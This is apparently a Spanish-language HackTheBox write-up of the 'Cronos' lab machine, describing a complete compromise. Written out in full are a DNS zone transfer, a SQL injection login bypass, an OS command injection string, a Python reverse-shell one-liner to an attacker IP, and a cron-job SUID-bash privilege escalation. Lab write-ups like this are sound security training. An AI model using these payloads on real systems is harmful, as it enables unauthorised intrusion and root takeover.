---
layout: single
title: Writeup HTB - Maquina Cronos
comments: true
excerpt: "La maquina Cronos es una maquina linux - Medium, comenzamos enumerando el puerto 53 obtenemos un dominio que nos lleva a una aplicacion web con un login, podemos bypassear el login con un ataque de SQL Injection y encontramos una funcion que nos permite hacer ping. Por lo tanto realizamos un ataque OS Command Injection que nos permite ejecutar comandos, obteniendo una reverse shell con el user www-data. Por ultimo logramos escalar privilegios como root aprovechando un tarea de cron que ejecuta un archivo php cada cierto tiempo, aprovechamos esto para dar permisos de suid al binario bash y poder escalar privilegios como el usuario root."
date: 2022-02-08
classes: wide
header:
  teaser: /assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Medium
  - Dns
  - dig 
  - SQLi
  - sql injection
  - bypass sqli
  - Os command injection
  - cron 
  - crontab
---

# HTB - Cronos
<p align="center">
<img src="/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Cronos es una maquina linux - Medium, comenzamos enumerando el puerto 53 obtenemos un dominio que nos lleva a una aplicacion web con un login, podemos bypassear el login con un ataque de SQL Injection y encontramos una funcion que nos permite hacer ping. Por lo tanto realizamos un ataque OS Command Injection que nos permite ejecutar comandos, obteniendo una reverse shell con el user www-data. Por ultimo logramos escalar privilegios como root aprovechando un tarea de cron que ejecuta un archivo php cada cierto tiempo, aprovechamos esto para dar permisos de suid al binario bash y poder escalar privilegios como el usuario root.
</div>

## Scan Nmap

```bash
# Nmap 7.92 scan initiated Sun Feb  6 12:10:25 2022 as: nmap -sC -sV -p22,53,80 -oN targeted -Pn -vvv 10.129.30.241
Nmap scan report for 10.129.30.241
Host is up, received user-set (0.19s latency).
Scanned at 2022-02-06 12:10:26 -05 for 16s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  6 12:10:42 2022 -- 1 IP address (1 host up) scanned in 17.24 seconds
```

## DNS - Puerto 53

primero que nada realizaremos una enumeracion DNS para obtener el dominio de esta maquina

```bash
Cronos # ❯ nslookup    
> server 10.129.30.241
Default server: 10.129.30.241
Address: 10.129.30.241#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
> exit
```

obtuvimos el subdominio ns1.cronos.htb asi que sabemos que el dominio es cronos.htb.  Asi que realizaremos un ataque de transferencia de zonas para obtener mas subdominios

```bash
Cronos # ❯ dig axfr cronos.htb @10.129.30.241

; <<>> DiG 9.16.22-Debian <<>> axfr cronos.htb @10.129.30.241
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.129.30.241
admin.cronos.htb.	604800	IN	A	10.129.30.241
ns1.cronos.htb.		604800	IN	A	10.129.30.241
www.cronos.htb.		604800	IN	A	10.129.30.241
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 187 msec
;; SERVER: 10.129.30.241#53(10.129.30.241)
;; WHEN: Sun Feb 06 13:05:03 -05 2022
;; XFR size: 7 records (messages 1, bytes 203)
```

agregaremos estos dominios al /etc/hosts

```bash
10.129.30.241 cronos.htb ns1.cronos.htb admin.cronos.htb www.cronos.htb
```

## Pagina web - Puerto 80

revisamos los dominios obtenidos y vemos que podemos acceder a una aplicacion pero no encontre nada interesate

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%201.png)

si revisamos los subdominios que encontramos anteriormente, encontramos un login

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%202.png)

probe un ataque de fuerza bruta con credenciales por defecto pero sin exito

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%203.png)

## Bypass SQLI

realizo un ataque de bypass SQLI y vemos que la aplicacion reacciona de forma diferente ya que notamos una redireccion

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%204.png)

dicha redireccion nos lleva a una funcion de la aplicacion 

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%205.png)

dicha funcion nos permite hace ping a una direccion

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%206.png)

## Os command injection

realizo pruebas para ejecutar comandos de la siguiente manera

```bash
8.8.8.8;whoami
```

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%207.png)

pudiendo ejecutar comandos como se muestra en la siguiente imagen

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%208.png)

## Reverse shell - User www-data

aprovechando que podemos ejecutar comandos, realizaremos los pasos para realizar una reverse shell, poniendo en escucha con netcat el puerto 443

```bash
Cronos # > nc -nlvp 443
```

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%209.png)

envio este payload para que la maquina victima se conecte a mi maquina de atacante

```bash
8.8.8.8;8.8.8.8;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.109",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

obteniendo una reverse shell con el usuario www-data

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%2010.png)

## Cron Jobs

nos situaremos en una carpeta de nuestra maquina de atacante donde tengamos [linpeas.sh](http://linpeas.sh) y crearemos un servidor web en python

```bash
Cronos # ❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

descargamos en la maquina victima

```bash
www-data@cronos:/tmp$ wget http://10.10.14.109/linpeas.sh
--2022-02-07 03:59:06--  http://10.10.14.109/linpeas.sh
Connecting to 10.10.14.109:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 320037 (313K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh       100%[=====================>] 312.54K   425KB/s    in 0.7s
```

ejecutamos linpeas

```bash
www-data@cronos:/tmp$ chmod +x linpeas.sh
www-data@cronos:/tmp$ ./linpeas.sh
```

encontramos que existe un tarea que esta ejecutando cada cierto tiempo

```bash
[snip]
/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Apr  9  2017 .
drwxr-xr-x 95 root root 4096 Oct 29  2020 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

revisamos los permisos de /var/www/laravel/artisan y tenemos permisos de escritura

```bash
www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

revisamos el contenido

```bash
#!/usr/bin/env php
<?php

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
| for our application. We just need to utilize it! We'll require it
| into the script here so that we do not have to worry about the
| loading of any our classes "manually". Feels great to relax.
|
*/

require __DIR__.'/bootstrap/autoload.php';

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Artisan Application
|--------------------------------------------------------------------------
|
| When we run the console application, the current CLI command will be
| executed in this console and the response sent back to a terminal
| or another output device for the developers. Here goes nothing!
|
*/

$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);

$status = $kernel->handle(
    $input = new Symfony\Component\Console\Input\ArgvInput,
    new Symfony\Component\Console\Output\ConsoleOutput
);

/*
|--------------------------------------------------------------------------
| Shutdown The Application
|--------------------------------------------------------------------------
|
| Once Artisan has finished running. We will fire off the shutdown events
| so that any final work may be done by the application before we shut
| down the process. This is the last thing to happen to the request.
|
*/

$kernel->terminate($input, $status);

exit($status);
```

por lo tanto modificare dicho archivo para dar permisos suid al binario bash 

```bash

GNU nano 2.5.3                                       File: /var/www/laravel/artisan                      Modified  

#!/usr/bin/env php
<?php
system("chmod u+s /bin/bash");
/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
| for our application. We just need to utilize it! We'll require it
| into the script here so that we do not have to worry about the
| loading of any our classes "manually". Feels great to relax.
|
*/
[snip]
```

asi de esta manera esperaremos un rato que la tarea se ejecute y escalamos privilegios como root de la siguiente manera 

```bash
www-data@cronos:/tmp$ /bin/bash -p
```

![Untitled](/assets/images/2022-02-08-writeup-maquina-htb-cronos/Untitled%2011.png)

gracias por leer este writeup, nos vemos AbelJM.